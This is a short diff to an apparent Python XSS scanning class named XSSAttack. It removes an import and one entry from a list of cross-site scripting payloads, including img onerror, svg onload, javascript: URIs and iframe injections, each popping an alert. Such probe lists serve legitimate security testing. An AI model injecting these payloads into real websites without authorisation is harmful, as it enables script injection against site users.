@@ -1,4 +1,4 @@
-import requests, re, time
+import requests,  time
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin, urlparse, parse_qs
 from concurrent.futures import ThreadPoolExecutor
@@ -15,7 +15,6 @@ class XSSAttack:
             "<img src=x onerror=alert('XSS')>",
             "javascript:alert('XSS')",
             "<svg/onload=alert('XSS')>",
-            "';alert('XSS');//",
             "<iframe src=javascript:alert('XSS')></iframe>",
             "<input onfocus=alert('XSS') autofocus>"
         ]
